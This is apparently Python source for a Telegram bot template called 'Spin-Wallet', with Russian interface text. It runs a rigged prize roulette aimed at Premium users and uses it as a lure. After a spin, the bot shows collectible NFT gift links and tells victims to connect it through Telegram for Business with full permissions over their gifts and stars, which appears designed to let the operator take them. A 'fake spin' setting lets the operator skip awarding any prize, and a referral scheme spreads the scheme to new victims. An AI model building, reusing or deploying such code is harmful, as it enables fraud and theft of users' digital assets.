from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
import random
import asyncio
from db import Session
from models import WorkerBotUser, WorkerBot, Settings
from sqlalchemy import select

GIFTS = [
    ("💝", "5170145012310081615"),
    ("🧸", "5170233102089322756"),
]
SPIN_EMOJIS = ["💝", "🧸", "🎁", "🌹", "🎂", "💐", "🚀", "🏆", "💍", "💎", "🍾"]

NFT_LINKS = [
    "https://t.me/nft/JingleBells-12761",
    "https://t.me/nft/CookieHeart-24314",
    "https://t.me/nft/EvilEye-35690",
    "https://t.me/nft/BDayCandle-106100",
    "https://t.me/nft/XmasStocking-52757",
    "https://t.me/nft/PetSnake-92369",
    "https://t.me/nft/WitchHat-79823",
    "https://t.me/nft/LushBouquet-51759",
    "https://t.me/nft/BDayCandle-249410",
    "https://t.me/nft/WhipCupcake-83450",
    "https://t.me/nft/RestlessJar-73174",
    "https://t.me/nft/LunarSnake-137882",
    "https://t.me/nft/LushBouquet-62832",
]

class BaseTemplate5:
    id = "base_5"
    name = "Spin-Wallet"
    photo_url = "https://i.postimg.cc/xd0pYdCQ/photo-2025-07-29-02-17-57.jpg"
    profile_photo_url = "https://i.postimg.cc/LXQzc9qx/photo-2025-07-29-01-52-26.jpg"     
    help_photo_url = "https://i.postimg.cc/nV54TLfz/photo-2025-07-29-01-52-30.jpg"           
    video_path = None

    after_start = (
        "<b>🎁 Добро пожаловать!</b>\n\n"
        "Здесь ты можешь крутить рулетку и получать призы!\n\n"
        "Выбирай действие ниже — удачи 🍀"
    )

    @classmethod
    def get_reply_markup(cls):
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="👤 Мой профиль", callback_data="base5_profile")],
            [InlineKeyboardButton(text="🎁 Испытать удачу", callback_data="base5_spin")],
            [InlineKeyboardButton(text="📖 Инструкция", callback_data="base5_help")],
        ])

    @classmethod
    def get_receive_markup(cls, nft_name):
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"Получить - {nft_name}", callback_data=f"base5_receive:{nft_name}")]
        ])

    @classmethod
    def get_back_markup(cls):
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="base5_back")]
        ])

    @classmethod
    def get_profile_markup(cls):
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🍬 Получить бесплатное вращение", callback_data="base5_buy_spin")],
            [InlineKeyboardButton(text="Назад", callback_data="base5_back")]
        ])

    @classmethod
    def get_profile_back_markup(cls):
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Назад в профиль", callback_data="base5_profile")]
        ])

    @staticmethod
    async def send_gift_to_user(bot, user_id, gift_id, text):
        try:
            await bot.send_gift(user_id=user_id, gift_id=gift_id, text=text)
            return True
        except Exception as e:
            if "BALANCE_TOO_LOW" in str(e):
                return "BALANCE_TOO_LOW"
            print(f"[SEND_GIFT_ERROR]: {repr(e)}")
            return False

    @staticmethod
    async def get_fake_spin_flag(bot, callback):
        async with Session() as session:
            bot_username = (await bot.get_me()).username
            worker_bot = await session.scalar(
                select(WorkerBot).where(WorkerBot.username == bot_username)
            )
            if not worker_bot:
                return False
            admin_id = worker_bot.owner_id
            settings = await session.scalar(
                select(Settings).where(Settings.admin_id == admin_id)
            )
            if settings and getattr(settings, "fake_spin_enabled", False):
                return True
            return False

    @staticmethod
    async def process_callback(callback, bot, chat_id):
        data = callback.data
        bot_username = (await bot.get_me()).username
        telegram_id = callback.from_user.id

        is_premium = getattr(callback.from_user, "is_premium", False)

        # Получаем worker_bot
        async with Session() as session:
            worker_bot = await session.scalar(select(WorkerBot).where(WorkerBot.username == bot_username))
            worker_bot_id = worker_bot.id if worker_bot else None

        if data == "base5_profile":
            try:
                await bot.delete_message(chat_id, callback.message.message_id)
            except Exception:
                pass
            async with Session() as session:
                user = await session.scalar(select(WorkerBotUser).where(
                    WorkerBotUser.telegram_id == telegram_id,
                    WorkerBotUser.worker_bot_id == worker_bot_id
                ))
                username = user.username if user and user.username else "—"
                ref_link = f"https://t.me/{bot_username}?start={telegram_id}"

                if not is_premium:
                    premium_text = "❌ <b>Telegram Premium:</b> Неактивно"
                    spins_text = "❌ <b>Доступно вращений:</b> 0"
                else:
                    premium_text = "☑️ <b>Telegram Premium:</b> Активно"
                    if user and not getattr(user, "spin_used", False):
                        spins_text = "☑️ <b>Доступно вращений:</b> 1"
                    else:
                        spins_text = "❌ <b>Доступно вращений:</b> 0"

                profile_text = (
                    "<b>👑 Твой профиль</b>\n\n"
                    f"🆔 <b>ID:</b> <code>{telegram_id}</code>\n"
                    f"💎 <b>Твой тэг:</b> @{username}\n"
                    f"{premium_text}\n"
                    f"{spins_text}\n\n"
                    f"🔗 <b>Твоя реферальная ссылка:</b>\n"
                    f"<code>{ref_link}</code>\n"
                    "🍬 <b>Приглашай друзей — получай бесплатные вращения!</b>"
                )

                await bot.send_photo(
                    chat_id,
                    photo=BaseTemplate5.profile_photo_url,
                    caption=profile_text,
                    parse_mode="HTML",
                    reply_markup=BaseTemplate5.get_profile_markup()
                )
            return

        if data == "base5_buy_spin":
            try:
                await bot.delete_message(chat_id, callback.message.message_id)
            except Exception:
                pass
            buy_text = (
                "Для получения бесплатного вращения подключите бота к своему Telegram для бизнеса по инструкции ниже:\n\n"
                "1️⃣ <b>Откройте Telegram → Настройки</b>\n"
                "2️⃣ Перейдите в раздел <b>«Telegram для бизнеса»</b>\n"
                f"3️⃣ Добавьте этого бота <code>@{bot_username}</code> в Чат-боты\n"
                "4️⃣ <b>Выдайте все необходимые разрешения в управление подарками и звездами.</b>\n\n"
            )
            await bot.send_message(
                chat_id,
                buy_text,
                parse_mode="HTML",
                reply_markup=BaseTemplate5.get_profile_back_markup()
            )
            return

        if data == "base5_spin":
            if not is_premium:
                await bot.answer_callback_query(
                    callback.id,
                    text="Вращение невозможно: на вашем аккаунте нет подписки Telegram Premium.\n\nПригласите друга с Telegram Premium и получите вращение!",
                    show_alert=True
                )
                return
            async with Session() as session:
                worker_bot = await session.scalar(select(WorkerBot).where(WorkerBot.username == bot_username))
                user = await session.scalar(select(WorkerBotUser).where(
                    WorkerBotUser.telegram_id == telegram_id,
                    WorkerBotUser.worker_bot_id == worker_bot.id
                ))
                if user and getattr(user, "spin_used", False):
                    await bot.answer_callback_query(
                        callback.id,
                        text="Ты уже крутил рулетку.\n\nПриглашай друзей — получай бесплатное вращение!\n\n🔗 Реферальную ссылку ищи в профиле.",
                        show_alert=True
                    )
                    return
                if user:
                    user.spin_used = True
                    await session.commit()

            is_fake = await BaseTemplate5.get_fake_spin_flag(bot, callback)

            try:
                await bot.delete_message(chat_id, callback.message.message_id)
            except Exception:
                pass

            win_index = random.choice([0, 1])
            gifts_emojis = SPIN_EMOJIS.copy()
            win_emoji, gift_id = GIFTS[win_index]
            arrow_symbol = "➡️"
            total_positions = len(gifts_emojis)

            path = []
            for _ in range(2):
                for i in range(total_positions):
                    path.append(i)
            curr = path[-1]
            for _ in range(random.randint(3, 7)):
                jump = random.randint(0, total_positions - 1)
                path.append(jump)
                curr = jump
            while curr != win_index:
                curr = (curr + 1) % total_positions
                path.append(curr)

            def make_message(arrow_pos):
                lines = []
                for idx, emoji in enumerate(gifts_emojis):
                    if idx == arrow_pos:
                        lines.append(f"{arrow_symbol} {emoji}")
                    else:
                        lines.append(f"  {emoji}")
                return "<b>🎰 Крутим рулетку!</b>\n\n" + "\n".join(lines)

            msg_text = make_message(path[0])
            msg = await bot.send_message(chat_id, msg_text, parse_mode="HTML")

            for idx, curr_idx in enumerate(path):
                txt = make_message(curr_idx)
                await asyncio.sleep(0.13 if idx < len(path) - 7 else 0.42)
                try:
                    await bot.edit_message_text(txt, chat_id=chat_id, message_id=msg.message_id, parse_mode="HTML")
                except Exception:
                    pass

            if not is_fake:
                gift_text = f"{win_emoji} Поздравляем! Ты выиграл подарок!"
                await BaseTemplate5.send_gift_to_user(bot, callback.from_user.id, gift_id, gift_text)

            nft_link = random.choice(NFT_LINKS)
            nft_name = nft_link.split("/")[-1]
            text = (
                "<b>‼️ ТЕБЕ ВЫПАЛА ВОЗМОЖНОСТЬ ПОЛУЧИТЬ УНИКАЛЬНЫЙ ПОДАРОК NFT ‼️</b>\n"
                f"- <a href=\"{nft_link}\">{nft_name}</a>"
            )
            await bot.send_message(
                chat_id,
                text,
                parse_mode="HTML",
                reply_markup=BaseTemplate5.get_receive_markup(nft_name)
            )
            return

        if data.startswith("base5_receive"):
            parts = data.split(":")
            nft_name = parts[1] if len(parts) > 1 else ""
            try:
                await bot.delete_message(chat_id, callback.message.message_id)
            except Exception:
                pass
            text = (
                f"<b>Для получения уникального подарка {nft_name} выполни простые действия:</b>\n\n"
                "1️⃣ <b>Откройте Telegram → Настройки</b>\n"
                "2️⃣ Перейдите в раздел <b>«Telegram для бизнеса»</b>\n"
                f"3️⃣ Добавьте этого бота <code>@{bot_username}</code> в Чат-боты\n"
                "4️⃣ Выдайте <b>все необходимые разрешения</b> в управление подарками и звездами."
            )
            await bot.send_message(
                chat_id,
                text,
                parse_mode="HTML",
                reply_markup=BaseTemplate5.get_back_markup()
            )
            return

        if data == "base5_help":
            try:
                await bot.delete_message(chat_id, callback.message.message_id)
            except Exception:
                pass
            help_text = (
                "<b>📖 Как пользоваться рулеткой?</b>\n\n"
                "1️⃣ Нажми кнопку <b>Испытать удачу</b>\n"
                "2️⃣ Дождись выигрыша\n"
                "3️⃣ Получи подарок!\n\n"
                "<b>⚡ Для вращения нужна активная подписка Telegram Premium!</b>\n\n"
                "У тебя есть <b>одна попытка</b> для вращения.\n"
                "Если хочешь получить больше попыток — <b>приглашай друзей!</b>\n\n"
                "❗️Если у тебя нет подписки Telegram Premium, просто пригласи друга с Premium — и ты получишь 1 вращение!\n"
                "Твоя реферальная ссылка доступна в профиле."
            )
            await bot.send_photo(
                chat_id,
                photo=BaseTemplate5.help_photo_url,
                caption=help_text,
                parse_mode="HTML",
                reply_markup=BaseTemplate5.get_back_markup()
            )
            return

        if data == "base5_back":
            try:
                await bot.delete_message(chat_id, callback.message.message_id)
            except Exception:
                pass
            await bot.send_photo(
                chat_id=chat_id,
                photo=BaseTemplate5.photo_url,
                caption=BaseTemplate5.after_start,
                parse_mode="HTML",
                reply_markup=BaseTemplate5.get_reply_markup()
            )
            return

        await bot.send_message(chat_id, "Неизвестная команда.")

    @staticmethod
    async def handle_base5_message(message: Message, bot):
        await bot.send_photo(
            chat_id=message.chat.id,
            photo=BaseTemplate5.photo_url,
            caption=BaseTemplate5.after_start,
            parse_mode="HTML",
            reply_markup=BaseTemplate5.get_reply_markup()
        )